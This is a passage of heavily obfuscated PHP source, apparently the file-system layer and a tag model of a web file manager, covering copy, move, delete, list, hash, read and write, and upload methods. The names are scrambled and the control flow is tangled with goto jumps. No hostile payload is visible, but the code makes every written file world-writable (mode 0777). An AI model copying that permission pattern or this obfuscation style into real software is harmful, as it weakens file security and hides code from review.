copyFile($Bùİˆ¹‚ », $Aë… «š‘) { $this->mkdir($this->pathFather($Aë… «š‘)); $Bùİˆ¹‚ » = $this->iconvSystem($Bùİˆ¹‚ »); $Aë… «š‘ = $this->iconvSystem($Aë… «š‘); $c±¹ò´…§¼ = copy_64($Bùİˆ¹‚ », $Aë… «š‘); @chmod($Aë… «š‘, 511); return $c±¹ò´…§¼ ? $this->getPathOuter($Aë… «š‘) : !1; } public function moveFile($D½ºŸÚƒ‚Ë, $E¶éß¼Œª) { goto A„ğ¢…‹Éí; d•¾›Ó˜¨: $bÜÇÁ„¢ø§ = intval(@rename($D½ºŸÚƒ‚Ë, $E¶éß¼Œª)); if (!$bÜÇÁ„¢ø§) { if ($bÜÇÁ„¢ø§ = intval(@copy_64($D½ºŸÚƒ‚Ë, $E¶éß¼Œª))) { @unlink($D½ºŸÚƒ‚Ë); } } @chmod($E¶éß¼Œª, 511); goto d¶ÏÊ„¢ñ†; d¶ÏÊ„¢ñ†: return $bÜÇÁ„¢ø§ ? $this->getPathOuter($E¶éß¼Œª) : !1; goto bœÓë†«Áª; A„ğ¢…‹Éí: $this->mkdir($this->pathFather($E¶éß¼Œª)); $D½ºŸÚƒ‚Ë = $this->iconvSystem($D½ºŸÚƒ‚Ë); $E¶éß¼Œª = $this->iconvSystem($E¶éß¼Œª); goto d•¾›Ó˜¨; bœÓë†«Áª: } public function delFile($C±’’àå˜—) { $C±’’àå˜— = $this->iconvSystem($C±’’àå˜—); if (!@unlink($C±’’àå˜—)) { @chmod($C±’’àå˜—, 511); if (!@unlink($C±’’àå˜—)) { return !1; } } else { return !0; } } public function delFolder($eêÅòÄ¨åì) { goto d¢¨åÃí¢Â; d¢¨åÃí¢Â: $dì’Àâ÷¥ =& $_SERVER[œº]; $eêÅòÄ¨åì = $this->iconvSystem($eêÅòÄ¨åì); if (!is_dir($eêÅòÄ¨åì)) { return !0; } goto bóÊè‘³‡; e“³„¡ñì: return rmdir($eêÅòÄ¨åì); goto a¥¾ô¢î”¼; bóÊè‘³‡: if (!($DöŠÉßˆõë = opendir($eêÅòÄ¨åì))) { return !1; } while (($CÊ‚ë‹ÀÓÛ = readdir($DöŠÉßˆõë)) !== !1) { if ($CÊ‚ë‹ÀÓÛ == $dì’Àâ÷¥[95] || $CÊ‚ë‹ÀÓÛ == $dì’Àâ÷¥[1252]) { continue; } $eäµÊÂÅ¶ = $eêÅòÄ¨åì . $dì’Àâ÷¥[8] . $CÊ‚ë‹ÀÓÛ; if (is_file($eäµÊÂÅ¶) || is_link($eäµÊÂÅ¶)) { if (!unlink($eäµÊÂÅ¶)) { chmod($eäµÊÂÅ¶, 511); if (!unlink($eäµÊÂÅ¶)) { return !1; } } } else { if (is_dir($eäµÊÂÅ¶)) { chmod($eäµÊÂÅ¶, 511); $eäµÊÂÅ¶ = $this->iconvApp($eäµÊÂÅ¶); if (!$this->delFolder($eäµÊÂÅ¶)) { return !1; } } } } closedir($DöŠÉßˆõë); goto e“³„¡ñì; a¥¾ô¢î”¼: } public function rename($AÁ×ÇªÌ², $aŸ»ÙìØ“˜) { goto C®ÎĞ°×º; c¼Ï—¹–³·: $AÁ×ÇªÌ² = $this->iconvSystem($AÁ×ÇªÌ²); $c·åØÀöŸÁ = $this->pathFather($AÁ×ÇªÌ²); $b’¯£©›ï = rtrim($c·åØÀöŸÁ, $AÅâìîŒ¼ß[8]) . $AÅâìîŒ¼ß[8] . $f…ËÄö“´Í; goto aï¥‚º¼Éñ; aï¥‚º¼Éñ: $a÷—™Æ’»¬ = @rename($AÁ×ÇªÌ², $b’¯£©›ï); $b’¯£©›ï = $this->iconvApp($b’¯£©›ï); return $a÷—™Æ’»¬ ? $this->getPathOuter($b’¯£©›ï) : !1; goto DÌé¤äÜ£; C®ÎĞ°×º: $AÅâìîŒ¼ß =& $_SERVER[œº]; $f…ËÄö“´Í = $this->fileNameAuto($this->pathFather($AÁ×ÇªÌ²), $aŸ»ÙìØ“˜); $f…ËÄö“´Í = $this->iconvSystem($f…ËÄö“´Í); goto c¼Ï—¹–³·; DÌé¤äÜ£: } public function size($DËôÀ‡‹·‡) { $DËôÀ‡‹·‡ = $this->iconvSystem($DËôÀ‡‹·‡); return filesize_64($DËôÀ‡‹·‡); } public function info($EÁ–³é»Œ¬) { $EÁ–³é»Œ¬ = $this->iconvSystem($EÁ–³é»Œ¬); if ($this->isFolder($EÁ–³é»Œ¬)) { return $this->folderInfo($EÁ–³é»Œ¬); } else { if ($this->isFile($EÁ–³é»Œ¬)) { return $this->fileInfo($EÁ–³é»Œ¬); } } return !1; } protected function infoChildren($Cçâ’¾ÔÚù, &$DÃ‡íàÑÁ», $dïÉ•“¶—Æ = true) { goto A„¼ùñˆ†Œ; A„¼ùñˆ†Œ: $c£¦Çê¶©– =& $_SERVER[œº]; check_abort_echo(); $Cçâ’¾ÔÚù = rtrim($Cçâ’¾ÔÚù, $c£¦Çê¶©–[8]) . $c£¦Çê¶©–[8]; goto AÔ®²‘†»™; F³ˆƒµø: closedir($A–šñœ§¬); goto cê•…§İ; AÔ®²‘†»™: if ($dïÉ•“¶—Æ) { $Cçâ’¾ÔÚù = $this->iconvSystem($Cçâ’¾ÔÚù); } if (!($A–šñœ§¬ = @opendir($Cçâ’¾ÔÚù))) { return; } while (($F¢»å´³¾ = readdir($A–šñœ§¬)) !== !1) { if ($F¢»å´³¾ == $c£¦Çê¶©–[95] || $F¢»å´³¾ == $c£¦Çê¶©–[1252]) { continue; } $Cºá‡£‡ùì = $Cçâ’¾ÔÚù . $F¢»å´³¾; if (is_file($Cºá‡£‡ùì) || is_link($Cºá‡£‡ùì)) { $DÃ‡íàÑÁ»[$c£¦Çê¶©–[79]]++; $DÃ‡íàÑÁ»[$c£¦Çê¶©–[78]] += filesize_64($Cºá‡£‡ùì); } else { if (is_dir($Cºá‡£‡ùì)) { $DÃ‡íàÑÁ»[$c£¦Çê¶©–[80]]++; $this->infoChildren($Cºá‡£‡ùì, $DÃ‡íàÑÁ», !1); } } } goto F³ˆƒµø; cê•…§İ: } private function folderInfo($c¶¢çä–ô, $A§ô±¦å‚ = false) { $A‡½Ğ ù” =& $_SERVER[œº]; $c¶¢çä–ô = rtrim($c¶¢çä–ô, $A‡½Ğ ù”[8]) . $A‡½Ğ ù”[8]; $c°®›æ¿™â = $this->iconvApp($this->pathThis($c¶¢çä–ô)); if ($A§ô±¦å‚) { return array($A‡½Ğ ù”[28] => $c°®›æ¿™â, $A‡½Ğ ù”[76] => $this->getPathOuter($c¶¢çä–ô), $A‡½Ğ ù”[29] => $A‡½Ğ ù”[77]); } $dº‹®„Ë¿¶ = array($A‡½Ğ ù”[28] => $c°®›æ¿™â, $A‡½Ğ ù”[76] => $this->getPathOuter($c¶¢çä–ô), $A‡½Ğ ù”[29] => $A‡½Ğ ù”[77], $A‡½Ğ ù”[194] => @filectime($c¶¢çä–ô), $A‡½Ğ ù”[84] => @filemtime($c¶¢çä–ô), $A‡½Ğ ù”[1255] => @fileatime($c¶¢çä–ô), $A‡½Ğ ù”[1256] => is_readable($c¶¢çä–ô), $A‡½Ğ ù”[1257] => is_writable($c¶¢çä–ô), $A‡½Ğ ù”[1258] => get_mode($c¶¢çä–ô)); return $dº‹®„Ë¿¶; } private function fileInfo($aîºÒÂÚÊŠ, $c‰¢¼ÖÙÈÂ = false) { $a¢î¯±ß =& $_SERVER[œº]; $FÁÃä„Ø„¬ = $this->iconvApp($this->pathThis($aîºÒÂÚÊŠ)); if ($c‰¢¼ÖÙÈÂ) { return array($a¢î¯±ß[28] => $FÁÃä„Ø„¬, $a¢î¯±ß[76] => $this->getPathOuter($aîºÒÂÚÊŠ), $a¢î¯±ß[29] => $a¢î¯±ß[193], $a¢î¯±ß[78] => $this->size($aîºÒÂÚÊŠ), $a¢î¯±ß[168] => $this->ext($FÁÃä„Ø„¬)); } $B‹£ÍŸë‹ = array($a¢î¯±ß[28] => $FÁÃä„Ø„¬, $a¢î¯±ß[76] => $this->getPathOuter($aîºÒÂÚÊŠ), $a¢î¯±ß[29] => $a¢î¯±ß[193], $a¢î¯±ß[194] => @filectime($aîºÒÂÚÊŠ), $a¢î¯±ß[84] => @filemtime($aîºÒÂÚÊŠ), $a¢î¯±ß[1255] => @fileatime($aîºÒÂÚÊŠ), $a¢î¯±ß[78] => $this->size($aîºÒÂÚÊŠ), $a¢î¯±ß[168] => $this->ext($FÁÃä„Ø„¬), $a¢î¯±ß[1256] => is_readable($aîºÒÂÚÊŠ), $a¢î¯±ß[1257] => is_writable($aîºÒÂÚÊŠ), $a¢î¯±ß[1258] => get_mode($aîºÒÂÚÊŠ)); return $B‹£ÍŸë‹; } public function exist($Eà½¾×º‡î) { $Eà½¾×º‡î = $this->iconvSystem($Eà½¾×º‡î); return @file_exists($Eà½¾×º‡î); } public function isFile($cî¥÷ĞäØ) { $cî¥÷ĞäØ = $this->iconvSystem($cî¥÷ĞäØ); return @is_file($cî¥÷ĞäØ); } public function isFolder($B³¶ï£™ø³) { $B³¶ï£™ø³ = $this->iconvSystem($B³¶ï£™ø³); return @is_dir($B³¶ï£™ø³); } public function listPath($F«±Å‹Íƒí, $fÅ„Ò¾ÀÈ‡ = false) { goto C–ïéô¹Š¥; C–ïéô¹Š¥: $BŸ‰‰·ŒÂ… =& $_SERVER[œº]; $F«±Å‹Íƒí = $this->iconvSystem($F«±Å‹Íƒí); $F«±Å‹Íƒí = rtrim($F«±Å‹Íƒí, $BŸ‰‰·ŒÂ…[8]) . $BŸ‰‰·ŒÂ…[8]; goto fŒ‡±¼Ñ¬; eŸ°ß„¿¢: closedir($BˆÓï®Ğì—); return $FÀöĞäÎ´¦; goto d¹ŞéİŠ†…; fŒ‡±¼Ñ¬: $FÀöĞäÎ´¦ = array($BŸ‰‰·ŒÂ…[75] => array(), $BŸ‰‰·ŒÂ…[74] => array()); if (!($BˆÓï®Ğì— = @opendir($F«±Å‹Íƒí))) { return $FÀöĞäÎ´¦; } while (($föÇÇöÜŒ = readdir($BˆÓï®Ğì—)) !== !1) { if ($föÇÇöÜŒ == $BŸ‰‰·ŒÂ…[95] || $föÇÇöÜŒ == $BŸ‰‰·ŒÂ…[1252]) { continue; } $Fè«ã‰Æ²Ù = $F«±Å‹Íƒí . $föÇÇöÜŒ; if (is_file($Fè«ã‰Æ²Ù)) { $FÀöĞäÎ´¦[$BŸ‰‰·ŒÂ…[74]][] = $this->fileInfo($Fè«ã‰Æ²Ù, $fÅ„Ò¾ÀÈ‡); } else { $FÀöĞäÎ´¦[$BŸ‰‰·ŒÂ…[75]][] = $this->folderInfo($Fè«ã‰Æ²Ù, $fÅ„Ò¾ÀÈ‡); } } goto eŸ°ß„¿¢; d¹ŞéİŠ†…: } public function listAll($Aù‡’ë“ø¦, &$bÁê¬ÀŠ¿³ = array()) { goto c½„¼‚ğº; EµºïŒˆù: if (!($bô£†Ñ˜…Æ = @opendir($Aù‡’ë“ø¦))) { return $bÁê¬ÀŠ¿³; } while (($bÉ™õ—¯‡Â = readdir($bô£†Ñ˜…Æ)) !== !1) { if ($bÉ™õ—¯‡Â == $fËéèÆ‡¤[95] || $bÉ™õ—¯‡Â == $fËéèÆ‡¤[1252]) { continue; } $Eƒ‡‘ô´‰Â = $Aù‡’ë“ø¦ . $bÉ™õ—¯‡Â; if (is_dir($Eƒ‡‘ô´‰Â) && !is_link($Eƒ‡‘ô´‰Â)) { $bÁê¬ÀŠ¿³[] = array($fËéèÆ‡¤[76] => $Eƒ‡‘ô´‰Â . $fËéèÆ‡¤[8], $fËéèÆ‡¤[77] => 1, $fËéèÆ‡¤[84] => @filemtime($Eƒ‡‘ô´‰Â), $fËéèÆ‡¤[78] => 0); $this->listAll($Eƒ‡‘ô´‰Â, $bÁê¬ÀŠ¿³); } else { $bÁê¬ÀŠ¿³[] = array($fËéèÆ‡¤[76] => $Eƒ‡‘ô´‰Â, $fËéèÆ‡¤[77] => 0, $fËéèÆ‡¤[84] => @filemtime($Eƒ‡‘ô´‰Â), $fËéèÆ‡¤[78] => $this->size($Eƒ‡‘ô´‰Â)); } } closedir($bô£†Ñ˜…Æ); goto Aê ˜àÃØ; Aê ˜àÃØ: return $bÁê¬ÀŠ¿³; goto DöáÎíÉ; c½„¼‚ğº: $fËéèÆ‡¤ =& $_SERVER[œº]; $Aù‡’ë“ø¦ = $this->iconvSystem($Aù‡’ë“ø¦); $Aù‡’ë“ø¦ = rtrim($Aù‡’ë“ø¦, $fËéèÆ‡¤[8]) . $fËéèÆ‡¤[8]; goto EµºïŒˆù; DöáÎíÉ: } public function has($bÌ…×ÆÇ¢ê, $fùÓŸ½ÅÄÊ = false, $D¯ØİèªÓ˜ = true) { goto bîö£Š³å¦; aÉ²¨÷áí°: $FŠÂ…â©İÖ = 0; while (($a­Ï—Å¥Š‘ = readdir($C»è·ëñÛ)) !== !1) { if ($a­Ï—Å¥Š‘ == $c£Ç…ÅæÖ‹[95] || $a­Ï—Å¥Š‘ == $c£Ç…ÅæÖ‹[1252]) { continue; } $FìÀëĞí” = $bÌ…×ÆÇ¢ê . $a­Ï—Å¥Š‘; if ($fùÓŸ½ÅÄÊ) { $FŠÂ…â©İÖ++; if (@is_file($FìÀëĞí”)) { $dŒ¶é™æ©·++; } else { $a¬¥¨Ğ…Ñ’++; } if ($FŠÂ…â©İÖ > 10000) { break; } continue; } if ($D¯ØİèªÓ˜) { if (@is_file($FìÀëĞí”)) { return !0; } } else { if (@is_dir($FìÀëĞí” . $c£Ç…ÅæÖ‹[8])) { return !0; } } } closedir($C»è·ëñÛ); goto eö®¿«Ÿ; EÌì»Ş£­±: if (!($C»è·ëñÛ = @opendir($bÌ…×ÆÇ¢ê))) { return !1; } $dŒ¶é™æ©· = 0; $a¬¥¨Ğ…Ñ’ = 0; goto aÉ²¨÷áí°; bîö£Š³å¦: $c£Ç…ÅæÖ‹ =& $_SERVER[œº]; $bÌ…×ÆÇ¢ê = $this->iconvSystem($bÌ…×ÆÇ¢ê); $bÌ…×ÆÇ¢ê = rtrim($bÌ…×ÆÇ¢ê, $c£Ç…ÅæÖ‹[8]) . $c£Ç…ÅæÖ‹[8]; goto EÌì»Ş£­±; eö®¿«Ÿ: if ($fùÓŸ½ÅÄÊ) { return array($c£Ç…ÅæÖ‹[203] => $dŒ¶é™æ©·, $c£Ç…ÅæÖ‹[204] => $a¬¥¨Ğ…Ñ’); } return !1; goto E¯ªÓ°–¼¡; E¯ªÓ°–¼¡: } public function hashSimple($AØ†í®ÃĞ×) { goto DöíÌÂ‘™ê; Dãè²­¡‡²: fseek_64($aÙŠ‘ø²ê´, $a¥„İ¨ğ¿ - $BîÔé‚äÈ); $BÏñæ×æŒ˜ .= fread($aÙŠ‘ø²ê´, $BîÔé‚äÈ); fclose($aÙŠ‘ø²ê´); goto açêİïˆø; Bç”¿ªÆèà: $aÙŠ‘ø²ê´ = fopen($AØ†í®ÃĞ×, $aÕ•œŸëÑó[1259]); if (!$aÙŠ‘ø²ê´) { return $BÏñæ×æŒ˜; } for ($D®¯ö”‡‡Ò = 0; $D®¯ö”‡‡Ò < $BåÓß™çŞì; $D®¯ö”‡‡Ò++) { fseek_64($aÙŠ‘ø²ê´, $FˆÈÔ”ˆéÇ * $D®¯ö”‡‡Ò); $BÏñæ×æŒ˜ .= fread($aÙŠ‘ø²ê´, $BîÔé‚äÈ); } goto Dãè²­¡‡²; aÌÃŠëÕ: $a¥„İ¨ğ¿ = $this->size($AØ†í®ÃĞ×); $BîÔé‚äÈ = 200; $BåÓß™çŞì = 50; goto c™ÃÌæŒÙ; DöíÌÂ‘™ê: $aÕ•œŸëÑó =& $_SERVER[œº]; if (!$AØ†í®ÃĞ×) { return md5($aÕ•œŸëÑó[33]); } $AØ†í®ÃĞ× = $this->iconvSystem($AØ†í®ÃĞ×); goto aÌÃŠëÕ; c™ÃÌæŒÙ: if ($a¥„İ¨ğ¿ <= $BîÔé‚äÈ * $BåÓß™çŞì) { return $this->hashMd5($AØ†í®ÃĞ×) . $a¥„İ¨ğ¿; } $BÏñæ×æŒ˜ = $aÕ•œŸëÑó[33]; $FˆÈÔ”ˆéÇ = intval($a¥„İ¨ğ¿ / $BåÓß™çŞì); goto Bç”¿ªÆèà; açêİïˆø: return md5($BÏñæ×æŒ˜) . $a¥„İ¨ğ¿; goto b·ğÈ„õ±·; b·ğÈ„õ±·: } public function getContent($dÍğ‘¨ç›ä) { $dÍğ‘¨ç›ä = $this->iconvSystem($dÍğ‘¨ç›ä); return file_get_contents($dÍğ‘¨ç›ä); } public function setContent($EóïÙò¤¤Û, $B‘±è‚ï…Ã = '') { $EóïÙò¤¤Û = $this->iconvSystem($EóïÙò¤¤Û); $E›¥ó©†Âô = @file_put_contents($EóïÙò¤¤Û, $B‘±è‚ï…Ã, LOCK_EX); clearstatcache(); @chmod($EóïÙò¤¤Û, 511); return $E›¥ó©†Âô === !1 ? !1 : !0; } public function fileSubstr($FÍ¶ÏÍƒ¢, $a¯æˆ˜¿é× = 0, $b‰î¬î¢®ô = false) { goto BÏÆ÷ñòŸ; e‡ğâñÃíé: fseek_64($b”†Å•¤¿ê, $a¯æˆ˜¿é×); $dåšóª¼“Î = fread($b”†Å•¤¿ê, $b‰î¬î¢®ô); fclose($b”†Å•¤¿ê); goto FÑñ‘¸èÉù; BÏÆ÷ñòŸ: $c±“¼Í°¹¼ =& $_SERVER[œº]; $FÍ¶ÏÍƒ¢ = $this->iconvSystem($FÍ¶ÏÍƒ¢); if ($b‰î¬î¢®ô === !1) { $b‰î¬î¢®ô = $this->size($FÍ¶ÏÍƒ¢); } goto díˆÛ®½ÖŸ; díˆÛ®½ÖŸ: if ($b‰î¬î¢®ô <= 0) { return $c±“¼Í°¹¼[33]; } $b”†Å•¤¿ê = fopen($FÍ¶ÏÍƒ¢, $c±“¼Í°¹¼[1259]); if (!$b”†Å•¤¿ê) { return !1; } goto e‡ğâñÃíé; FÑñ‘¸èÉù: return $dåšóª¼“Î; goto A¼ô½ÇãĞÄ; A¼ô½ÇãĞÄ: } public function upload($D•Š„êĞè, $B—È½³ÛË , $B²ÚÕ‚óÜª = false, $e¤¶ßÒÎœ = REPEAT_REPLACE) { if ($B²ÚÕ‚óÜª) { return $this->moveFile($B—È½³ÛË , $D•Š„êĞè); } return $this->copyFile($B—È½³ÛË , $D•Š„êĞè); } public function setModifyTime($FÉÏï¯•‘Á, $DŸÃƒ Èª§ = '') { @touch($FÉÏï¯•‘Á, intval($DŸÃƒ Èª§)); } public function download($C¥óƒš›­Ë, $d¶¡‡Ó¨ß£) { return $this->iconvSystem($C¥óƒš›­Ë); } } goto E³ø¤¼ò; AÀ˜ÖÇ‘Ù: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($b†µ†êÁ™‘) { $b‡¨Ó§ğ”× =& $_SERVER[œº]; return array($b‡¨Ó§ğ”×[1794] => array(USER_ID, $b‡¨Ó§ğ”×[1795])); } protected function listData() { $a¥¸ˆ„êÑÔ =& $_SERVER[œº]; $b¯Ù‹ñ£†¿ = array($a¥¸ˆ„êÑÔ[1520] => USER_ID, $a¥¸ˆ„êÑÔ[463] => array($a¥¸ˆ„êÑÔ[1798], 0)); $a¸ØÃóõ¿ç = $a¥¸ˆ„êÑÔ[1800]; $bÑæÇÜŸ = $this->field($a¸ØÃóõ¿ç)->where($b¯Ù‹ñ£†¿)->order($a¥¸ˆ„êÑÔ[1801])->select(); return $bÑæÇÜŸ ? $bÑæÇÜŸ : array(); } protected function listByTag($fÒí†®¬ ²) { } protected function addToTag($a‘†öÚ…¢, $F—îÁåøî¬) { $AÀªß˜¦Œ‘ =& $_SERVER[œº]; if (!Model($AÀªß˜¦Œ‘[1936])->listData($F—îÁåøî¬) || !Model($AÀªß˜¦Œ‘[790])->pathInfo($a‘†öÚ…¢)) { return !1; } $Eß¿÷È·õ = array($AÀªß˜¦Œ‘[1520] => USER_ID, $AÀªß˜¦Œ‘[463] => $F—îÁåøî¬, $AÀªß˜¦Œ‘[414] => $a‘†öÚ…¢, $AÀªß˜¦Œ‘[415] => $AÀªß˜¦Œ‘[409], $AÀªß˜¦Œ‘[413] => $AÀªß˜¦Œ‘[33], $AÀªß˜¦Œ‘[1696] => 0); if ($this->where($Eß¿÷È·õ)->find()) { return !1; } return $this->add($Eß¿÷È·õ); } protected function removeFromTag($e´ª¸öçê‡, $aµ©å¾àÚ) { $FÌ»áÖè„ =& $_SERVER[œº]; if (!Model($FÌ»áÖè„[1936])->listData($aµ©å¾àÚ)) { return !1; } if (is_array($e´ª¸öçê‡)) { $e´ª¸öçê‡ = array($FÌ»áÖè„[7], $e´ª¸öçê‡); } $D°¦é‹Š‰Í = array($FÌ»áÖè„[1520] => USER_ID, $FÌ»áÖè„[463] => $aµ©å¾àÚ, $FÌ»áÖè„[415] => $FÌ»áÖè„[409], $FÌ»áÖè„[414] => $e´ª¸öçê‡); return $this->where($D°¦é‹Š‰Í)->delete(); } protected function removeByTag($Aø¼“ßçÎ) { $CÍ‡³‰…¦ =& $_SERVER[œº]; if (!$Aø¼“ßçÎ) { return !1; } $e†äë¿éÑ = array($CÍ‡³‰…¦[1520] => USER_ID, $CÍ‡³‰…¦[463] => $Aø¼“ßçÎ); return $this->where($e†äë¿éÑ)->delete(); } protected function removeBySource($EÑ¨Éä¼ÅÚ) { $E×¨ÆËƒàŠ =& $_SERVER[œº]; if (is_array($EÑ¨Éä¼ÅÚ)) { $EÑ¨Éä¼ÅÚ = array($E×¨ÆËƒàŠ[7], $EÑ¨Éä¼ÅÚ); } $DëÎŸ»¢Ñ = array($E×¨ÆËƒàŠ[1520] => USER_ID, $E×¨ÆËƒàŠ[414] => $EÑ¨Éä¼ÅÚ, $E×¨ÆËƒàŠ[463] => array($E×¨ÆËƒàŠ[971], 0)); return $this->where($DëÎŸ»¢Ñ)->delete(); } }